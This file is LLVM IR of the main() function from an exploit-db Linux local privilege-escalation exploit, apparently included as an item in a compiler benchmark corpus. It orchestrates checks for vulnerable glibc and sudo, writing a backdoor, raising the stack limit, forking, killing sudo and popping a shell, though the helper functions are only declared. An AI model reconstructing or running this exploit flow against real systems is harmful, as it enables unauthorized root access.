; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25134.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25134.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i8* }
%struct.rlimit = type { i32, i32 }

@ver = common dso_local global %struct.TYPE_3__ zeroinitializer, align 8
@.str = private unnamed_addr constant [27 x i8] c"[+] Targeting release: %s\0A\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"[+] Press enter when ready...\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@RLIMIT_STACK = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [42 x i8] c"[-] An error occurred while forking sudo\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.rlimit, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @uname(%struct.TYPE_3__* @ver)
  %11 = load i8*, i8** getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @ver, i32 0, i32 0), align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8* %11)
  %13 = call i64 (...) @is_glibc_vuln()
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %30

15:                                               ; preds = %2
  %16 = call i64 (...) @is_sudo_vuln()
  %17 = icmp ne i64 %16, 0
  br i1 %17, label %18, label %27

18:                                               ; preds = %15
  %19 = call i64 (...) @write_backdoor()
  %20 = icmp ne i64 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %18
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* %8)
  br label %26

24:                                               ; preds = %18
  %25 = call i32 @exit(i32 0) #3
  unreachable

26:                                               ; preds = %21
  br label %29

27:                                               ; preds = %15
  %28 = call i32 @exit(i32 0) #3
  unreachable

29:                                               ; preds = %26
  br label %32

30:                                               ; preds = %2
  %31 = call i32 @exit(i32 0) #3
  unreachable

32:                                               ; preds = %29
  %33 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 1
  store i32 -1, i32* %33, align 4
  %34 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 0
  store i32 -1, i32* %34, align 4
  %35 = load i32, i32* @RLIMIT_STACK, align 4
  %36 = call i32 @setrlimit(i32 %35, %struct.rlimit* %6)
  %37 = call i64 (...) @fork()
  store i64 %37, i64* %9, align 8
  %38 = icmp slt i64 %37, 0
  br i1 %38, label %39, label %41

39:                                               ; preds = %32
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

41:                                               ; preds = %32
  %42 = load i64, i64* %9, align 8
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %47

44:                                               ; preds = %41
  %45 = call i32 (...) @set_env()
  %46 = call i32 (...) @kill_sudo()
  br label %56

47:                                               ; preds = %41
  %48 = call i32 @wait(i32* %7)
  %49 = load i32, i32* %7, align 4
  %50 = call i64 @WIFEXITED(i32 %49)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %55

52:                                               ; preds = %47
  %53 = call i32 @sleep(i32 1)
  %54 = call i32 (...) @pop_shell()
  br label %55

55:                                               ; preds = %52, %47
  br label %56

56:                                               ; preds = %55, %44
  br label %57

57:                                               ; preds = %39, %56
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

declare dso_local i32 @uname(%struct.TYPE_3__*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @is_glibc_vuln(...) #1

declare dso_local i64 @is_sudo_vuln(...) #1

declare dso_local i64 @write_backdoor(...) #1

declare dso_local i32 @scanf(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @set_env(...) #1

declare dso_local i32 @kill_sudo(...) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i64 @WIFEXITED(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @pop_shell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
